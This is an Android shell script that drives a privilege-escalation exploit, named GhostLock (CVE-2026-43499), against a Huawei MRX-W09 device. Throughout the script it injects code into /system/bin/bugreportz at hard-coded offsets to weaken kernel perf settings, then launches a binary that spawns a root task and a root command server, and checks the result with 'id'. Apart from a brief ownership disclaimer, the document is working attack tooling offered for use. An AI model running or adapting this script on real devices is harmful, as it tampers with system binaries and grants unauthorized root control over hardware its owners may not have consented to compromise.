#!/system/bin/sh
# reroot.sh - one-command re-root for Huawei MRX-W09 (GhostLock / CVE-2026-43499)
#
# The exploit is per-boot: the root server lives only until reboot.  Everything under
# /data/local/tmp persists, so re-rooting after a reboot is a single command:
#
#     adb shell /data/local/tmp/reroot.sh
#
# Prerequisites (push once):
#     adb push ghostlock_e    /data/local/tmp/
#     adb push inject_hook    /data/local/tmp/
#     adb push reroot.sh      /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/reroot.sh inject_hook ghostlock_e
#
# Only use on a device you own.  See docs/PUBLICATION_REVIEW_ja.md.

D=/data/local/tmp
say() { echo "[reroot] $*"; }

[ -x "$D/inject_hook" ] || { say "inject_hook missing in $D"; exit 2; }
[ -x "$D/ghostlock_e" ] || { say "ghostlock_e missing in $D"; exit 2; }

# 1) arm and inject the enabler into /system/bin/bugreportz, then trigger it
say "enabling (inject + bugreportz)"
$D/inject_hook place 0x84000 0x244 0x7a3d8 >/dev/null 2>&1
$D/inject_hook hook  0x7a3d4 0x84000          >/dev/null 2>&1
nohup /system/bin/bugreportz >/dev/null 2>&1 &
i=0
while [ $i -lt 12 ]; do
    sleep 3
    [ "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)" = "-1" ] && break
    i=$((i+1))
done
$D/inject_hook restore 0x7a3d4 0xd10403ff >/dev/null 2>&1

if [ "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)" != "-1" ]; then
    say "enabler FAILED (perf_event_paranoid != -1) - reboot and retry"
    exit 1
fi
say "enabler OK (perf_event_paranoid=-1)"

# 2) run the endgame (forks the shielded uid-0 task and the root command server)
say "running --simple"
nohup $D/ghostlock_e --simple >/dev/null 2>&1 &

# 3) wait for the root server, then verify
i=0
while [ $i -lt 40 ]; do
    sleep 3
    if [ -x "$D/rsh" ] && $D/rsh -c true >/dev/null 2>&1; then break; fi
    i=$((i+1))
done

say "verify:"
$D/rsh -c id 2>&1
